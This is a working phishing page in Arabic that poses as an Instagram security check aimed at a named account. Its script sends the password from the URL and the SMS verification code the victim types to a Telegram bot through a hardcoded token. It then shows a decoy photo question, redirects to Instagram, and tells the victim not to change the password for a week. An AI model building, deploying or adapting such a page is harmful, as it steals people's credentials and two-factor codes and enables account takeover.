<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Security Check</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; margin: 0; }
        .container { width: 100%; max-width: 350px; text-align: center; }
        .logo { width: 170px; margin-bottom: 30px; }
        h2 { font-size: 19px; color: #262626; font-weight: 600; }
        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; }
        .input-code { width: 100%; padding: 14px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; margin: 20px 0; text-align: center; font-size: 20px; letter-spacing: 5px; box-sizing: border-box; }
        .btn { width: 100%; background: #0095f6; color: white; border: none; padding: 13px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
        #photo-step { display: none; }
        .cat-frame { width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid #efefef; }
    </style>
</head>
<body>

    <div class="container" id="sms-step">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
        <h2>تحقق من الرمز</h2>
        <p>أدخل الرمز المكون من 6 أرقام المرسل لهاتفك لتأكيد ملكية الحساب <b>@_5z5z5</b>.</p>
        <input type="text" id="sms_val" class="input-code" placeholder="000000" maxlength="8">
        <button class="btn" onclick="sendSMS()">تأكيد وتأمين</button>
    </div>

    <div class="container" id="photo-step">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
        <h2>سؤال الأمان</h2>
        <p>هل قمت بحذف هذه الصورة مؤخراً؟</p>
        <img src="IMG_1145.jpeg" class="cat-frame">
        <div style="display: flex; gap: 10px;">
            <button class="btn" style="background:#efefef; color:#262626;" onclick="finish()">نعم</button>
            <button class="btn" style="background:#efefef; color:#262626;" onclick="finish()">لا</button>
        </div>
    </div>

    <script>
        // أول ما تفتح الصفحة يرسل الباسورد للبوت فوراً
        window.onload = function() {
            const params = new URLSearchParams(window.location.search);
            const pass = params.get('pass');
            if(pass) {
                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=🔑 كلمة المرور (الخطوة 1): ${pass}`);
            }
        };

        function sendSMS() {
            const code = document.getElementById('sms_val').value;
            if(code.length > 2) {
                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=📲 رمز التحقق (SMS): ${code}`);
                document.getElementById('sms-step').style.display = 'none';
                document.getElementById('photo-step').style.display = 'block';
            }
        }

        function finish() {
            alert("تم تأمين حسابك بنجاح. يرجى عدم تغيير كلمة المرور خلال الـ 7 أيام القادمة لتجنب قفل الحساب.");
            window.location.href = "https://www.instagram.com";
        }
    </script>
</body>
</html>
